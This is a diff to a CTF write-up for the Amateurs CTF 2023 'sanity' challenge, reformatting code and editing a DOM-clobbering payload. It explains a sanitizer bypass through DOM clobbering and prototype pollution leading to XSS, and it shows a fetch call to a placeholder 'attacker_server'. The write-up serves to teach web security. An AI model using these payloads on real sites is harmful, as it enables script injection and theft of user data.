@@ -7,6 +7,7 @@ Author: Voxal
 Points: 481
 Solves: 33
 ---
+[![DOM Clobbering, Prototype Pollution and XSS - "sanity" Walkthrough - Amateurs CTF 2023](https://img.youtube.com/vi/AO7CDquZ690/0.jpg)](https://youtu.be/AO7CDquZ690 "DOM Clobbering, Prototype Pollution and XSS - "sanity" Walkthrough - Amateurs CTF 2023")
 
 ### Description
 >check out this pastebin! its a great way to store pieces of your sanity between ctfs.
@@ -182,23 +183,23 @@ await page.goto(`http://localhost:3000/${sane}`);
 So how can we trigger the XSS? If we look at line 50 in `sane.ejs`, we'll see that a `sanitizer` will sanitize our payload *unless* `debug.sanitize` is false.
 ```js
 if (debug.sanitize) {
-	document.getElementById("paste").setHTML(body, { sanitizer })
+    document.getElementById("paste").setHTML(body, { sanitizer })
 } else {
-	document.getElementById("paste").innerHTML = body
+    document.getElementById("paste").innerHTML = body
 }
 ```
 
 This brings us onto the next problem; `sanitize` is set to `true` by default in the class declaration on line 20.
 ```js
 class Debug {
-	#sanitize;
-	constructor(sanitize = true) {
-		this.#sanitize = sanitize
-	}
+    #sanitize;
+    constructor(sanitize = true) {
+        this.#sanitize = sanitize
+    }
 
-	get sanitize() {
-		return this.#sanitize;
-	}
+    get sanitize() {
+        return this.#sanitize;
+    }
 }
 ```
 
@@ -216,11 +217,11 @@ So, if we could control `extension`, we could potentially use [Prototype Polluti
 We look through the code to find where extension is assigned, there's a function at line 31.
 ```js
 async function loadBody() {
-	let extension = null;
-	if (window.debug?.extension) {
-		let res = await fetch(window.debug?.extension.toString());
-		extension = await res.json();
-	}
+    let extension = null;
+    if (window.debug?.extension) {
+        let res = await fetch(window.debug?.extension.toString());
+        extension = await res.json();
+    }
 ```
 
 Extension is set to null! It then checks for `window.debug.extension` and if exists, makes a HTTP request to that URL and sets extension to contain the response, which is expected to be JSON data.
@@ -295,7 +296,7 @@ fetch('https://attacker_server')
 
 Side note: The [official solution](https://gist.github.com/voxxal/fb69443f0a31bc6f2ddbce763d609935#sanity) from the challenge author used a different technique. By specifying the `data` value, they were able to assign the desired JSON object directly.
 ```js
-<a id=debug><a id=debug name=extension href='data:;,{"__proto__":{}}'>
+<a id=debug><a id=debug name=extension href='data:;,{"report": true}'>
 ```
 
 If, like me, you were using a `SimpleHTTPServer` with python, exposed via `ngrok` then you'll notice you didn't receive a request.
@@ -335,13 +336,13 @@ So, if extension exists, the `debug` object will be assigned it's properties (el
 Therefore, the properties of `debug` simply mirror the `Debug` class, the `debug.report` condition returns false and the report link is never created.
 ```js
 if (debug.report) {
-	const reportLink = document.createElement("a");
-	reportLink.innerHTML = `Report <%= id %>`;
-	reportLink.href = `report/<%= id %>`;
-	reportLink.style.marginTop = "1rem";
-	reportLink.style.display = "block"
+    const reportLink = document.createElement("a");
+    reportLink.innerHTML = `Report <%= id %>`;
+    reportLink.href = `report/<%= id %>`;
+    reportLink.style.marginTop = "1rem";
+    reportLink.style.display = "block"
 
-	document.body.appendChild(reportLink)
+    document.body.appendChild(reportLink)
 }
 ```
 
